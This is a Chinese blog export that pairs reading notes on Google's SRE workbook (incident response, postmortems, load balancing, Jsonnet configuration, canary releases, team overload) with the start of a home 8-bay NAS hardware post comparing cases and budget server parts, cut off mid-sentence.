灵活性自动化排班系统： 可以对值班表做出调整，以适应团队成员的需求变化 可以自动重新平衡每个人的 On-Call 工作量 把类似于“4月周末不担任主 On-Call”之类的需求、每个工程师近期值班历史都考虑进去，尽力保证公平合理 不能随意改动已经生成的值班表 鼓舞 On-Call 团队士气 给予 SRE 更多权限（提交 MR 修复） 加强团队之间的联系（团建） 事故响应事故管理的前提是有条不紊地响应事故。 Google 的事故管理Google 事故管理系统（IMAG）基于事故指挥系统（ICS）。 事故响应框架的目标（三个C）： 协调（Coordinate） 沟通（Communicate） 控制（Control） 事故响应中的主要角色：事故总负责人（Incident Commander）发言人（Communications Lead）业务负责人（Operations Lead） 案例Google Home 案例成功的事故管理不能依赖于其成员在工作日以外的无私奉献。我们应该改在工作时间发布新版本，或者在非工作时间安排有报酬的 On-Call 值班。在完全定位根本原因前，应该推迟发布新版本。尽早地声明事故。 GKE 案例使用了多个清晰记载的事故升级渠道，并对事故响应策略谙熟于心。高度复杂性和对专家的高度依赖都是有问题的。缓解问题是头等大事。 一个正在发生的事故应该这么处理： 评估事故的影响范围 缓解这些影响 分析事故地根本原因 在事故结束后，修复那些引发事故地问题，并撰写事故报告 闪电击中 Google 数据中心案例一开始就声明事故。事故总负责人将标准化工作分配给合适的业务负责人，工程师努力修复问题，并向业务负责人汇报。事故负责人确保事故处理的同时，专业于事故地核心部分：尽快满足受影响客户的需求。 PagerDuty 服务时钟漂移事故通过以下手段来促进团队合作： 共同参与实战模拟练习 进行有时间限制的模拟游戏 以史为鉴（撰写并定期阅读事后总结） 事故响应流程用到的工具： PagerDuty Slack 电话会议系统 实施事故响应培训可以开发一个适合自己团队的事故处理框架，例如： On-Call 人员知道他们在事故处理过程中可以委派和调用相关人员，也可以升级给合适的人员。 营造缓解问题第一、彻底修复第二的氛围。 设立事故地总负责人、发言人、业务负责人等相关角色。 可以调整和描述你们自己的事故响应框架，并用幻灯片的形式展示给新加入的成员。 前期准备在响应事故时，在协调和共同方式上达成共识。 确定好沟通渠道（Slack、电话会议系统、IRC、HipChat 等等） 及时通告情况发展 准备联系人名单 建立事故标准 演习灾难恢复测试（Disaster Recovery Testing, DiRT） “小题大做” 定期举行演习 事后总结：从失败中学习一份差劲的事后总结： 缺少上下文（背景情况、词汇表），你的受众群体不仅仅只有直接相关的团队 省略关键细节 量化影响的大小 确定根本原因和触发因素 修复的过程 关键行动项目缺失 试图改变人类的行为，不如改变自动化系统和流程来得可靠。（“让我们为未来做好计划，要注意未来的我们像今天一样愚蠢”） 所有行动项都标记为相同的优先级，没有办法确定先要采取哪项行动 只有一个项目指派了工单，如果没有跟踪流程，行动项目往往会被遗忘，导致再次发生 适得其反的指责：在事故总结中强调个人过失，会导致团队变得厌恶风险，还会导致工程师们故意掩盖一些有助于理解故障和防止故障复发的至关重要的事实。 生动的语言和对事件戏剧性的描述会分散读者对关键信息的关注 缺少负责机制：设置一个负责人和多个协作者比较好一些 受众有限：应该尽可能广泛地分享时候总结，甚至与客户分享。全面诚实的事后总结是巩固不可动摇的信任关系的关键工具。 发布延迟：事故发生后 4 个月后才发布 一份优秀的事后总结： 明晰（词汇表、行动项目、可量化的指标） 具体的行动项目有负责人、优先级，并且可以对完成结果进行度量，有预防、缓解的措施 对事不对人 深度（多个团队的系统缺陷及影响） 迅速（1 周内撰写完成并发布） 简明（细节以链接的形式展示，在完整性和可读性之间取得平衡） 组织激励树立和加强对事不对人的模式 使用对事不对人的语言 让所有参与事故处理的人员参与时候总结的撰写 收集反馈 奖励事后总结的成果 奖励行动项目的落实（不能虎头蛇尾） 奖励积极地组织改革（奖金、绩效、晋升） 强调可靠性的提高（报告、幻灯片、绩效考评） 给事故总结的负责人以应得荣誉（电子邮件、提供讲述经验的机会） 游戏化（计分板、燃尽图） 公开分享事后总结 在整个组织内分享公告（电子邮件、Slack、定期全体大会） 进行跨团队审阅（提出问题并相互学习，跨职能小组） 举办培训活动（“命运之轮”练习） 故障周报 面对事后总结文化的淡化 尽可能避免撇清干系的想法 加强对事不对人的文化 保证事后总结的优先级 防止事故复发 工具和模板事后总结模板 Google PagerDuty 改编自第一本 SRE 书的模板 GitHub dastergon 的模板 GitHub juliadunn 的模板 Server Fault 事后总结工具 Google 的 Requiem 工具 PagerDuty 的时候总结 Etsy 的 Morgue 工具 VictorOps 管理负载Google 云负载均衡基于 DNS 的负载均衡：最简单、最有效；本地 DNS 记录更新需要依赖客户端的合作。Anycast：将客户端发送到最近的集群而不依赖于 DNS 的地理位置，将数据包重定向至最近的服务，从而可以使用一个 VIP 提供低延迟服务。 Anycast通过网络中多个点的边界网关协议（BGP）公布 IP 地址，将来自用户的数据包转发至一个最近的前端。但存在两个主要的问题： 附近用户太多的情况有可能淹没一个前端站点。 BGP 路由计算可能会重置链接：ISP 重新计算 BGP 路由导致路由“震荡”，所有正在进行的 TCP 流会被重置。 MaglevMaglev 解决 Anycast 的路由震荡问题。 GSLB全球负载均衡系统 GFEGoogle 前端 接受 TCP，终结 SSL，检查 HTTP header 和 URL，重新加密数据转发至对应服务。 对后端服务进行健康检查，摘除失效的后端。 会话保持，降低延迟。 GCLBGoogle 云负载均衡系统 低延迟 高可用 自动伸缩考虑不健康实例根据实例的平均利用率来判断是否需要伸缩，如果实例需要长时间准备才能开始服务，或者实例卡在非服务状态时，容易引发故障。改善策略： 根据负载均衡器观察到的容量指标进行自动伸缩 等待新实例就绪后再收集指标 自动修复（重启）异常实例 有状态服务基于智能分级路由（一致性哈希）的负载均衡垂直扩容（对所有实例生效，造成资源浪费） 保守地配置对流量的突增的反应应该比对流量下降更敏感。自动伸缩器需要足够的时间做出反应，同时处于过载保护的预留冗余的目的，面向用户的服务应该预留足够的备用容量。 设置约束 Bug 导致跑满 CPU，自动伸缩器无限制地扩大规模，知道资源配额耗尽。 依赖服务发生故障，请求卡住，自动缩放器扩大规模，导致更多的请求卡住。需要配置好最小和最大限制，确保有足够的资源配额。 准备中止开关如果出现问题，On-Call 工程师可以手动禁用，中止功能应当简单、明显、快速，且有玩呗的说明文档。 避免后端超载部署自动伸缩器之前，对后端服务进行详细的依赖性分析，确保后端有足够的额外容量来应对突发流量，并在过载时能够优雅地降级。分析后确定自动伸缩器的上限。 避免流量不均衡跨区域自动伸缩 管理负载的多种策略 负载均衡：GCLB、Nginx、HAProxy 减载：Zuul、Envoy 自动伸缩：Kubernetes Pod AutoScaling 为 RPC 请求设置截止时间 非抽象大型系统设计NALSD 基本设计阶段 可能吗？ 如果不必担心 CPU、内存、网络带宽等资源限制，我们能做出什么样的设计来满足需求？ 还能做得更好吗？ 能否是系统更快、更小、更高效？ 纵向扩展阶段 这还可行吗？ 考虑到资金、硬件方面的限制，此设计是否可以扩展？ 有弹性吗？ 这个组件发生故障时会发生什么？整个数据中心出现故障时系统会怎样？ 还能做得更好吗？ 数据处理流水线流水线应用ETL 模型（Extract Transform Load） 从数据源中提取、转置、重新加载为特定结构化数据。Transform 阶段用例： 变更数据格式，添加或删除字段 跨数据源的聚合计算 建立数据索引，为使用数据的任务提供更好地特性 ETL 流水线常用使用场景： 机器学习或商业智能用例的预处理步骤 聚合计算 建立索引 数据分析分析日报、月度报告。 机器学习 从较大的数据集中萃取数据特征及标签 根据提取到的特征，用 ML 算法训练模型 通过一组测试评估模型 准备其他服务使用做好的模型 其他系统根据模型所提供的反馈作出决策 最佳实践定义和度量 SLO数据新鲜度 X% 的数据在 Y 时间内完成处理 最旧的数据不超过 Y 时间 流水线作业会在 Y 时间内成功完成 数据正确性 模拟对账检查正确性 Y 时间范围内的错误率不超过账单总额的 X% 数据隔离/负载均衡 优先级队列 端到端的度量 以客户的视角度量系统端到端的健康状况 为依赖性故障做好准备创建和维护流水线文档系统图示：每个组件（流水线应用程序或数据存储）以及每个步骤发生的转换。监控每个阶段的当前状态，每个阶段的执行时间。流程文档：记录常规任务是如何执行的，记录不太常见（手动）的任务，自动化。工作手册：描述解决问题的步骤。 梳理开发生命周期 原型 1% 试运行 预发布 金丝雀发布 部分部署 生产环境部署 减少热点和工作负载模式将热点隔离在一个数据集上。将任务细化，然后进行动态重新平衡。快速开关、快速发布配置。 实现自动扩容和资源规划资源成本和流水线效率的权衡。定期检查清理不再使用的资源。快速定位导致资源使用量显著增加的任务。 ACL 和安全策略避免将个人身份信息（PII）明文放在临时存储空间中。限制对数据的访问，仅授予每个流水线阶段读取前一阶段输出数据所需的最小访问权限。为日志和 PII 设置 TTL 限制。 流水线需求分析和设计需要什么功能？ 幂等：多次执行，产生相同结果 检查点：对于长期运行的任务定期地将部分状态保存下来，以便在中断时可以继续处理。 代码模式：重用、微服务 投产准备：成熟度矩阵 流水线故障的预防和响应潜在的故障模式 延迟的数据 受损的数据 可能的原因 依赖组件故障（存储、网络） 程序 bug、配置错误 负载意外增加 可用区故障 配置设计与最佳实践什么是配置用于改变软件系统行为的人机界面。 软件系统的三个关键组件： 软件本身 数据集 配置 配置原则： 如何构造配置 如何实施正确的抽象级别 如果无缝地支持不同的用例 配置机制： 语言设计 部署策略 与其他系统的交互 配置原则理想中的配置管理是完全不需要进行配置。但对于许多系统来说，这种理想的情形不可能在现实中出现。 最小化用户输入原则：远离大量的可调因子，趋向简单化。可以减少人员在系统中可操作的控制量，可以缩小误差的表面积和操作员的认知负担。 现代软件系统，从两个不同角度去看待人机交互模型： 以基础设施为中心的视角：提供尽可能多的配置选项。 以用户为中心的视角：选项越少越好。 在系统刚开始建设的时候，我们可以使用基础设施为中心的视角，随着系统的渐渐成熟，可以通过各种方式删除掉一部分配置选项，然后系统可能会慢慢地转型为更以用户为中心的视角。 满足高级用户的一种策略：提供复杂配置项，将复杂配置项作为默认选项。 配置机制配置和数据分离： 界面：Web UI、API、配置语言（JSON、YAML、INI、XML、DSL） 配置数据：与配置语言相分离，避免相互耦合 目标系统 配置系统应当具备： 语义验证 配置语法：语法高亮、代码风格检查、自动语法格式化 每段配置代码应当标明负责人 实现版本控制，支持回退 安全配置变更必备的主要特性： 循序渐进地部署，避免全有全无的变更。（为什么 Kubernetes 使用滚动更新而不是热更新的原因） 如果已发布的配置存在问题，能够回滚变更。 如果变更导致操作员的失控，能够自动回滚（或中断变更）。 配置规范减少配置带来的琐事考虑完全抛弃配置，程序内动态检测更改某些值通过自动化来减少配置参数集中的重复劳动，集成新的语言，改进或替换现有配置结构 配置系统设计的陷阱 没有把配置作为一种编程语言 设计一种特殊的语言 在特定领域做了很多优化，用户群体却很小 将“配置评估”与“外部干扰”交织在一起，在配置运行期间查询或更改外部系统 使用现有通用脚本语言（Python、Ruby、Lua） 集成配置语言集成现有应用程序：Kubernetes 将 YAML 转换为 JSON 通过 Jsonnet 格式化程序运行上述 JSON 手动添加 Jsonnet 构造函数，用于抽象并实例化代码 针对不同配置的公共性进行抽象可以促进关注点的分离，与编程语言中的模块化有相同的优势： 一个团队可能需要为一个组件创建几乎相同（但不完全相同）的多个版本的配置 不同的组件通过不同的模板维护，任何团队都可以实例化这个模板，并覆盖必要的配置信息 集成定制应用程序 使用 Jsonnet 的最佳实践 输入是根据功能将配置拆分为多个文件，输出是一个文件 用对象名称作为 key，对象实体作为 value，避免使用 name 字段的对象数组 1234{ &quot;cat&quot;: {...}, &quot;dog&quot;: {...}} 优于 1234[ {&quot;name&quot;: &quot;cat&quot;, ...}, {&quot;name&quot;: &quot;dog&quot;, ...}] 避免在顶层按类型对实体进行分组，要对 JSON 进行结构化，以便将与逻辑相关的配置分组在同一子树中。 1234{ &quot;cat&quot;: {&quot;age&quot;: 1, &quot;weight&quot;: 20}, &quot;dog&quot;: {&quot;age&quot;: 3, &quot;weight&quot;: 100}} 优于 1234{ &quot;ages&quot;: {&quot;cat&quot;: 1, &quot;dog&quot;: 3}, &quot;weights&quot;: {&quot;cat&quot;: 20, &quot;dog&quot;: 100}} 有效地运行配置系统版本控制当对模板库进行重大更改时，有两种选择： 提交一个涉及所有服务的全局更新，触发所有服务的重构。 对库进行版本控制，以便不同使用者可以使用不同的版本，并独立迁移。选择过时版本的用户将无法享受到新版本的好处，并且会积累技术债务，总有一天，他们将不得不为了适配新的库而重构配置相关代码。通过目录实现版本控制。 源代码控制将配置纳入源代码管理。 工具规范配置语言中的代码风格，集成到工作流程中。 测试对上游的模板库实施单元测试。 何时生成配置在提交前进行生成流程： 修改 Jsonnet 文件 运行 Jsonnet 命令行工具重新生成 JSON 文件 使用 hook 确保 Jsonnet 代码与 JSON 输出结果始终保持一致 将所有内容提交到 PR 中，进入代码评审阶段优点： 评审者可以对具体的变更进行完整性检查 可以查看多个编写者在不同版本上对每行的注释，对于评审很有用 无需在运行时运行 Jsonnet，有助于限制复杂性和风险缺点： 生成的 JSON 不一定是可读的 如果 JSON 太大或者包含机密信息，可能不适合直接存储在版本控制系统 如果某一个 JSON 文件上同时进行了多个不同的编辑，就可能会发生合并冲突 在编译时进行生成流程： PR 中只包含 Jsonnet 代码 在编译时运行 Jsonnet 工具，将生成的 JSON 嵌入到发布制品中 应用程序在初始化时读取 JSON 文件优点： 可以控制运行时的复杂性和风险，不必在每个 PR 时重建 JSON 文件 原始 Jsonnet 代码与 JSON 之间不会存在不一致的风险缺点： 编译期复杂 在代码评审期间很难评估具体的变更 在运行时生成流程： PR 中只包含 Jsonnet 代码 应用程序本身引入了 Jsonnet 库，可以随时对配置进行解释，将生成的 JSON 配置在内存中展示出来。 优点： 操作简单，不需要事先生成 可以在运行期间评估用户提供的 Jsonnet 代码 缺点： 任何引入的库都不会留下使用记录，同时增加了暴露的风险 在运行时发现配置错误的话就有些晚了 不受信任的 Jsonnet 代码可导致滥用 防止滥用配置Jsonnet 或其他配置语言的灵活性导致 CPU 或内存的滥用。 金丝雀发布发布工程：从获取代码到将它真正运行在生产环境的过程中，我们所处理的所有相关流程和制品。金丝雀发布：为了对服务完成一次变更和评估，按时间阶段进行循序渐进的部署。 金丝雀：已经完成变更的这部分服务控制：尚未完成变更的剩余服务 发布工程的基本原则可复现的构建自动化的构建自动化的测试自动化的部署小规模的部署 平衡发布速率和可靠性通过 SLO 和错误预算来衡量发布对可靠性的影响，而不是倡导不做变更。目标应该是：在实现用户期望的可靠性目标的同时，尽快发布软件。 发布工程和金丝雀发布通过用很少的一部分流量来测试每一个变更，从而降低引入新特性或新功能所带来的风险，确保不会造成大面积不良影响。 金丝雀流程的需求： 需要有将金丝雀变更部署到一个服务群体子集的方法 需要有能对金丝雀变更部分进行评估的流程 将金丝雀评估流程整合到发布流程里 实施金丝雀发布 将 SLO 和错误预算的风险降至最低 总错误率 = 金丝雀比例 * 错误率 选择金丝雀群体和持续时间 一次只运行一个金丝雀部署 规模和持续时间 流量 时段 指标 选择和评估指标 指标应该反映出问题 指标应该有代表性和归因性 多阶段评估 依赖关系和隔离非交互系统中的金丝雀 确保金丝雀的最小持续时间比单个工作单元的持续时间更长 始终确保将待处理的特定工作单元任务交给同一个处理机池 指标选取：端到端时间、处理质量 监控数据需求 进行细粒度分类，区别金丝雀群体和对照群体的指标 聚合时间的区别，金丝雀指标需要更敏感 相关概念 蓝绿部署 人工负载生成 流量复制 发现运维超负荷并从中恢复超负荷：是一种职业压力，会降低生产力包括： 认知上困难的任务（调试内存泄露或段错误） 需要进行频繁上下文切换的小任务 导致超负荷的原因： 团队没有足够的时间处理过多的任务 无法预测 On-Call 时出现的问题以及工作量有多少 频繁的中断和外部压力因素交织在一起 没有给工作设定合理的优先级 案例1：团队规模缩小一半后的工作超负荷实践 低成本的自动化技术，一旦部署了就会大大削减运维负荷 撰写参考文档，以便客户自助查询 关闭积压工单（延期、冗余、不紧急）经验 识别工作中超负荷状况，并确定它的影响范围 避免新的中断积压 每两周对中断进行一次分类 每个成员待处理工单数量不超过 10 个 提醒成员关闭过期工单 沟通工作进展，转移部分工单 提醒成员关注工单列表 安排一次全体成员的工单修复日 通过一定的工作解决某类工单的共同问题 案例2：团队发生变化后的感知超负荷实践 短期：减轻压力并改善心理安全，以建立健康的工作氛围 设立半定期的圆桌会议来讨论问题 通过 On-Call 人员在值班结束之后解决工单所需的时间来衡量负荷 删除无效邮件告警 静默告警 增加一个专门负责该团队的直线经理 重新平衡团队 开展团建活动，缓解团队紧张感并提高心理安全性 中期：查找导致超负荷问题的本质原因 将运维工作尽可能限制在 On-Call 轮值期间 将服务所有权交换给开发团队 通过培训建立团队成员的自信心 从远程团队引进 SRE，提供一些有价值的新视角 填补团队空缺位置 静默过期前解决每个告警 管理层有意识地倾听团队痛点，并找到驱动团队的解决方案 长期：解决导致级联的持续性问题 SLO 保持一致，减少 SRE 认知负担 重新审查服务以符合当前生产的标准 经验 感知上的超负荷也是超负荷 告警数量实际没有太大变化，但失去了两名成员，导致增加了认知负担 少数成员感知上的超负荷会很快导致整个团队的超负荷 缓解超负荷的策略识别超负荷的症状 团队士气低迷 团队成员长时间工作，甚至带病工作 更频繁地生病 不健康的任务队列 指标不平衡 长时间解决某个问题 处理琐事的比例很高 用大量时间解决 On-Call 问题 减少超负荷并恢复团队健康 发现和缓解心理压力源 对一个记录的工作进行优先级排序 保护未来的自己 建立评估团队工作量的指标，并确保它是正确的 更优先地安排项目工作，以减少重复的琐事 每个人都应对超负荷早期预警信号负责 SRE 参与模式服务的生命周期SRE 团队对服务可靠性的贡献贯穿于服务生命周期的所有阶段。 阶段 1：架构与设计 创建最佳实践 基于先前的经验，记录特定基础设施系统的各种该做的事与不该做的事，让开发人员避免已知的陷阱 提供早期的咨询，讨论特定的体系结构和详细的设计选型，辅助在目标原型的帮助下验证假设 加入开发团队，并参与开发工作 共同设计服务的某个部分 阶段 2：积极开发生产化（Productionizing） 容量规划 负载平衡 监控告警、性能调优 阶段 3：有限可用性 在 GA 之前就要定义 SLO，以便服务团队能客观地度量服务的可靠性 告警与 SLO 匹配 在 GA 以前，运维事件需要通知服务所有者（共同参与） 阶段 4：一般可用性（GA）GA 早期，开发团队需要对系统在真实压力下的表现保持持续地关注GA 后期，开发团队需要提供一些小的功能增量和程序补丁，其中一些来源于运维的需求，以及过去所发生的一些生产事件 阶段 5：退出SRE 需要在没有开发团队介入的情况下运维现有系统，并同时支持新系统的开发和运维工作 阶段 6：放弃SRE 将服务交还给开发团队 阶段 7：中止支持SRE 帮助删除该服务 建立关系沟通业务和生产的优先级 了解产品开发人员期望 SRE 参与实现的目标 SRE 应该对产品和业务目标有过深入的了解 SRE 应该能够阐明自己的角色，如何使开发人员能够朝着那些目标前进 理想情况下，SRE 和开发人员的领导团队应该工作得犹如一个整体，定期的开会，并就技术和优先级方面的挑战交换意见。 识别风险专注于系统可靠性，尽可能识别风险，以及它们的潜在影响。 对其目标SRE 的工作重点是支持服务的长期运行，而不是新功能的发布 制定基本规则在 Google 每个 SRE 团队都有两个主要目标： 短期：通过提供可运作的稳定系统来满足产品的业务需求，该系统不仅可用，还可根据需求扩展，并着眼于可维护性 长期：将服务运维优化到不再需要目前所执行的人工工作的水平，因此 SRE 团队可以继续开展下一个高价值工作 为此团队之间应该商定一些合作原则： 运维工作的定义 可度量的 SLO 季度错误预算 开发人员参与运维工作（看到持续存在的问题，并确定修复问题的优先级） 规划与执行与开发人员领导一起确定产品和服务的年度路线图定期回顾和更新路线图，并努力实现与路线图一致的目标 维持有效的持续关系花时间在更好地合作中 与开发团队定期会面 与其他 SRE 团队定期会面 保持顺畅的沟通 SRE 可以每季度与产品开发负责人进行一次“生产状态”演讲，帮助他们了解应该在哪些方面投入资源，以及 SRE 在产品或服务方面究竟做出了什么贡献。 开发人员可以向 SRE 团队定期进行一次“产品状态”演讲，使 SRE 团队可以大致了解开发团队在每个季度中所取得的成果，以及后续的方向。 进行定期服务审查基本规则开始下滑时需要追因根据 SLO 和错误预算调整优先级合理处置错误 在感到疲倦或情绪激动时，如果可能的话不要进行跟进对话 当面开会解决问题 保持乐观 了解沟通的差异性 在更大的环境里规模化推行 SRE 一个 SRE 团队支持多个服务 根据技术线（存储、网络）组织 SRE 团队，而不是根据产品域 SRE 团队结构主动顺应变化的环境（优先拆分而不是从头开始构建） 多地域分布式的 SRE 团队 终止关系SRE：跨越壁垒 SLO 和 SLI 是 SRE 的语言 审核监控系统，构建共享仪表盘 度量并重新协商 审计评审流程，进行风险分析 实践、实践、再实践 有思想、有纪律 SRE 团队生命周期原则：SRE 需要制定面向后果的 SLO。SRE 必须有时间使明天变得比今天更好。SRE 团队需要有工作量的调控权。 第一个 SRE 团队组建期 作为重大项目的一部分组建新团队 组建横向新团队 转型一个现有团队 规范期 SLO 和错误预算已经落实到位，领导层对 SLO 度量很感兴趣 On-Call 轮值已建立且可持续，成员有足够的工具、文档、培训支持 琐事工作被文档记录、限制和管理 事后总结文化已经建立 团队已展示出上面的原则 从问题中总结经验教训，并预防复发 产品开发团队将 On-Call 中收益 定期生成报表 执行期 成为所有架构设计和变更的合作伙伴 拥有完全的工作量自决定权 打造更多 SRE 团队原因： 服务复杂度：按架构、语言、地域拆分 SRE 推广：影响越大，优先级越高 地域分隔 多团队运作的建议实践 角色交换：开发在 SRE 团队实习 SRE 交换：SRE 与其他团队 SRE 工作 培训 横向项目：减少重复劳动 SRE 流动性：转向产品开发团队 出差：资金支持 成立协调工程团队（LCE） 卓越生产：定期进行服务评审 SRE 预算和招聘：人数应该小于需求，确保定期评估支持服务的优先级 管理 SRE 的组织变革变革管理： Lewin 的三阶段模型 McKinsey 的 7-S 模型 Kotter 的变革八步法 Prosci ADKAR 模型 基于情感的模型 戴明环","link":"/hexo-blog/2021/07/08/%E3%80%8AGoogle%20SRE%20%E5%B7%A5%E4%BD%9C%E6%89%8B%E5%86%8C%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"},{"title":"我的 NAS 方案（硬件篇）","text":"背景首先说说我的需求，为什么打算组装 8 盘位的 NAS 呢？ 第一是数据量的需求，作为一个老网民，经过十几年的积累，个人资料、照片、无损音乐、高清电影已经达到了几十T，硬盘数量也达到了十几个，原先 4 盘位的 HPE MicroServer Gen8 已经无法满足我的日常需求。第二是便利性的需求，之前被 HPE MicroServer Gen8 的颜值吸引，先后买了两台，数据分散存储在这两台机器里，很难随心所欲地放置，而且两台经常需要同时开机，一台 8 盘位机器维护会简便很多。第三是数据可靠性的考虑，4 盘位综合考虑性能成本可靠性的情况下，RAID5/RAIDZ 可能是最好的选择，但两台 4 盘位的机器组 RAID5/RAIDZ 远不如一台 8 盘位的组 RAID6/RAIDZ2 可靠。第四，为什么不用群晖，威联通等商业方案呢？贵是一个原因，其次是系统比较封闭，因为我的工作和云密切相关，对 Linux、Docker、Kubernetes 等技术也非常熟悉，通过开源方案搭建家用 NAS 是一个很吸引人的解决方案。 然后再说说我关注的几点： 盘位，至少 8 盘位，否则升级的意义不大，因为我已经有两台 4 盘位机器了 体积，我对体积很敏感，因为家里的空间有限，没有条件放置全尺寸机箱和刀片服务器，所以小钢炮是第一选择 成本：预算有限，不会为了完美而追求很贵的机箱，但为了颜值还是愿意多花一点钱，总之还是遵循垃圾佬的思维，花最少的钱买到最值得的东西 功耗：虽然不会 7*24 开机，而是随用随开，但是功耗仍然是我关注的一个方面 机箱选择我云调研了市面上一些主流的 8 盘位机箱，最终过滤出以下几款，希望给感兴趣的朋友们做个参考。 银欣 CS381从外部看做工挺好，前部有挡板，8 个 3.5 盘位（热插拔） + 4 个 2.5 盘位（需要固定在机箱内部），支持 M-ATX，支持 SFX 电源，支持 4 个全高扩展插槽，对我来说价格很贵，同时个头有点大，放置比较占地方，所以排除掉了。 价格：2199 元，淘宝链接。 视频介绍： https://www.youtube.com/watch?v=kYJ491SRN2E&amp;ab_channel=VedioTalk https://www.youtube.com/watch?v=JI-hbHG_HDc&amp;t=602s&amp;ab_channel=%E5%8F%B8%E6%B3%A2%E5%9B%BE 推荐指数：★★★☆☆ 银欣 CS380银欣 CS380 最大的优势就在于可以使用 ATX 主板，支持 7 个扩展槽，扩展性很强，可以选择标准 ATX 电源，相对于 MATX/ITX 方案来说，装机成本可以小很多。8 个 3.5 盘位，2 个 5.25 扩展槽位，可以再放两块硬盘。这款机箱的价格也可以接受，但个头实在太大了，对于我这种摆放空间有限，喜欢小钢炮的人来说不太合适。 价格：949 元，淘宝链接。 视频介绍： https://www.youtube.com/watch?v=Do3CDNGxpEE&amp;ab_channel=%E5%8F%B8%E6%B3%A2%E5%9B%BE 推荐指数：★★★☆☆ 银欣 DS380相对于以上几款机箱方案来说，DS380 更侧重于存储，8 个 3.5 盘位插槽，机箱内部可以再装 4 个 2.5 硬盘，支持 ITX 主板，扩展性一般，八百多的价格还算不错，配合银欣 ST30SF 300W SFX 电源，比较推荐，适合注重机箱体积而不那么在意扩展性的朋友，不过要注意的是这款机箱纵深略长，可以根据具体空间情况选择。 价格：859 元，淘宝链接 视频介绍： https://www.youtube.com/watch?v=nM8VzNSEpwU&amp;ab_channel=%E5%8F%B8%E6%B3%A2%E5%9B%BE 推荐指数：★★★★☆ 万由 810A优点就不多说了，体积小巧，8 个 3.5 盘位插槽，内部可以再装 1 个 2.5 硬盘，板材做工比银欣要好，支持 M-ATX 主板，支持 2 个全高扩展插槽，作为纯 NAS 使用非常合适。但相对于上面几款缺点也很明显，机箱价格略贵，只能装小 1U 电源，市面上小 1U 电源选择实在太少，全新电源价格相对标准 ATX 或 SFX 来说还是要贵很多（嘿嘿，垃圾佬当我没说），但考虑到体积因素也可以接受。为什么我没有选择这款机箱呢？价格是一个方面，自己的使用环境，灰尘还是比较多的，这款机箱主面板用了碳纤维材质，个人担心容易落灰，打理起来比较麻烦，所以放弃了这这款机箱，如果有自己的机柜，带玻璃门那种的话会好太多。 价格：1358 元，淘宝链接。 视频介绍： https://www.youtube.com/watch?v=WkAfFso0Igo&amp;ab_channel=VedioTalk https://www.youtube.com/watch?v=1gCKWVjxctg&amp;ab_channel=VedioTalk https://www.youtube.com/watch?v=_ve0km0fAzM&amp;ab_channel=BIGDONGDONG 推荐指数：★★★★★ 山寨工控机箱（蜗牛星际）体积小巧，既可以横置也可以纵置，8 个 3.5 盘位，机箱内部勉强能塞下 1~2 个 2.5 硬盘，支持 ITX 主板 (17cm*17cm)，1 个全高扩展插槽，只支持小 1U 电源，做工中规中矩。最大的优点是什么呢？便宜！便宜！便宜（土豪请鄙视我）！我最终选择了这款。 真正用的时候还是有很多要注意的地方： CPU 散热器一定不要超过 4cm，否则装不进去，会被硬盘位挡住 自带的两个机箱风扇默认最大转速运行，且不支持自动调速，噪音极大，必须换成静音风扇 ITX 主板注意尺寸，要买 17cm*17cm 的，如果像我一样不小心买到 17cm*19cm 的，还想用扩展卡，呵呵，那么只能扔掉重买了 开放式的硬盘插槽，容易进灰，需要加防尘网，但是前面板是铝合金材质的，不能用磁帖，只能用其他方式固定 价格：460 元，淘宝链接 推荐指数：★★★★★ 主机配置和大部分装机流程不同的是，我先选择机箱，再选择主板方案，因为机箱的选择实在是太难，而主板 CPU 的选择相对就容易很多。而我又对盘位和机箱体积要求比较高，所以先确定机箱，会少走很多弯路，节省很多时间。 围绕配置选择，考虑的因素有： 主板尺寸：我选择的这款工控机箱，只支持 17cm*17cm 主板，所以只能选择 ITX 方案。 Intel 还是 AMD：因为个人对 Intel 比较熟悉，再加上信仰原因，所以只考虑 Intel。我选择了 Intel 4 代 CPU (Haswell, Socket 1150)，4 代的可玩性很高，从 20 元的 G1820 到 400 元的 i7 4790，再到 E3 Xeon 服务器 CPU，可选择的空间很大。 是否需要服务器主板和 ECC 内存：如果对数据可靠性要求极高，需要 ECC 内存的支持，预算比较宽裕的话还是建议上服务器主板 + ECC 内存，但相对于高昂的价格，带来肉眼不可见的数据可靠性的提升，个人认为现实意义有待于讨论。可根据实际情况去选择。 参考配置作为一个垃圾佬，CPU、主板当然不会买全新的了，标注的价格是海鲜市场的价格，但只作为一个参考，实际因为成色、运气、时间等因素，价格可能有所差距。 配置一（ITX） CPU i7 4790t 580元 （不推荐） e3 1265l v3 225元 （性价比高） 主板 映泰 H81 MDV5 130元 (17cm*19cm，尺寸问题，我的机箱放不下) 梅捷 H81N 158元 (17cm*19cm，尺寸问题，我的机箱放不下) 微星 H81i 198元 (17cm*17cm) 华硕 H81i-Plus 220元 (17cm*17cm) 内存 DDR3 8G * 2 200元 扩展 LSI9211-i8 HBA 直通卡 2008 芯片 100元 Intel 82576 芯片双口千兆网卡（选配） 80元 电源 全汉 FLEX 小1U 300W 150元 参考：https://www.youtube.com/watch?v=Do3CDNGxpEE&amp;ab_channel=%E5%8F%B8%E6%B3%A2%E5%9B%BE 配置二（ITX ECC）追求稳定性的朋友可以上服务器主板： CPU Xeon E3 1235L v5 560元 主板 永擎 C236 WSL 1600元 内存 DDR4 ECC 8G * 2 500元 其他同上 参考：https://www.youtube.com/watch?v=iN_unArno0Y&amp;ab_channel=%E7%BF%BC%E7%8E%8B 配置三（ATX ECC）如果空间和功耗不是问题，可以选择 ATX 方案（参考司波图大哥的配置）。 CPU e5 2650 v2 58元 主板 华硕 Z9PA-U8 （2011针单路服务器主板） 500元 内存 DDR3 REG ECC 4G*8=32G 24*8=192元 扩展 MIO 专用接口声卡 索泰 GTX1060 3G ITX 显卡 富士通 OEM i350 四口千兆网卡 TG-NET OEM 82599es 芯片双光口万兆网卡 NVME 转接卡 https://www.youtube.com/watch?v=Do3CDNGxpEE&amp;ab_channel=%E5%8F%B8%E6%B3%A2%E5%9B%BE 硬件选择细节CPU 与主板CPU 与主板的兼容性可以在 CPU-Upgrade 网站里查询。例如： Intel 芯片组列表 H81 芯片组支持的 CPU 列表 微星 H81I 主板支持的 CPU 列表 支持 E3-1275L v3 的主板列表 一些主流服务器的升级信息也可以在 IT Connected 网站里获取。例如： 通用主板兼容性指南 Intel 4代 CPU 列表： Intel Haswell 内存非 ECC、纯 ECC、REG ECC，根据个人条件选择，我最终选择是普通非 ECC 内存。注意纯 ECC 